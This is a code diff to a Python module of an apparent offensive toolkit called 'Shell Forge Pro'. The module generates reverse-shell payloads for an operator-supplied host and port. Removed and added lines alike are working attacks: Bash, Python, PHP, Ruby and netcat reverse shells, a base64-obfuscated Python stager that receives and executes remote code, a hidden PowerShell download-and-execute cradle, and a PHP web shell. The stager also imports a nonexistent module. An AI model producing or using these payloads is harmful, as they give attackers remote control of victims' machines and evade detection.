@@ -1,34 +1,48 @@
 import base64
+import random
+import string
 from rich.console import Console
 from rich.syntax import Syntax
 from core.ui import draw_header
 
 console = Console()
 
+
+def generate_stager(lhost, lport):
+    """Generates a polymorphic Python stager that executes in memory."""
+    v_sock = ''.join(random.choices(string.ascii_lowercase, k=5))
+    v_data = ''.join(random.choices(string.ascii_lowercase, k=5))
+
+    # This stub connects, receives an encrypted payload, and executes it
+    raw_python = f"""
+import socket,os,memory_temp
+{v_sock}=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+{v_sock}.connect(("{lhost}",{lport}))
+{v_data}={v_sock}.recv(1024)
+exec({v_data})
+"""
+    return base64.b64encode(raw_python.encode()).decode()
+
+
 def generate_shell():
-    draw_header("Shell Forge")
+    draw_header("Shell Forge Pro: Multi-Stage")
     lhost = console.input("[bold yellow]LHOST (Your IP): [/bold yellow]")
     lport = console.input("[bold yellow]LPORT (Your Port): [/bold yellow]")
 
-    if not lhost or not lport: return
+    if not lhost or not lport:
+        return
 
-    # PowerShell logic stays for Windows targets
-    ps_raw = f'$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sy=([text.encoding]::ASCII).GetBytes($sb+"PS "+(pwd).Path+"> ");$s.Write($sy,0,$sy.Length);$s.Flush()}};$c.Close()'
-    ps_b64 = base64.b64encode(ps_raw.encode('utf-16le')).decode()
+    stager = generate_stager(lhost, lport)
 
     shells = {
-        "Bash TCP": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-        "Python3": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
-        "PHP Reverse": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-        "Ruby Reverse": f"ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
-        "Netcat (mkfifo)": f"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} >/tmp/f",
-        "PS Obfuscated": f"powershell -e {ps_b64}"
+        "Python Polymorphic Stager": f"python3 -c \"import base64;exec(base64.b64decode('{stager}'))\"",
+        "PowerShell Obfuscated": f"powershell -NoP -NonI -W Hidden -Enc {base64.b64encode(f'IEX (New-Object Net.WebClient).DownloadString(\"http://{lhost}/p.ps1\")'.encode('utf-16le')).decode()}",
+        "Netcat Traditional": f"nc {lhost} {lport} -e /bin/bash",
+        "PHP Web-Shell Hook": f"<?php system($_GET['cmd']); ?>"
     }
 
     for name, code in shells.items():
         console.print(f"\n[bold cyan]--- {name} ---[/bold cyan]")
-        # Professional formatting for different languages
-        lang = "bash" if any(x in name for x in ["Bash", "Netcat", "PHP", "Python"]) else "powershell"
-        console.print(Syntax(code, lang, theme="monokai", word_wrap=True))
+        console.print(Syntax(code, "bash", theme="monokai", word_wrap=True))
 
     input("\nPress Enter to return...")
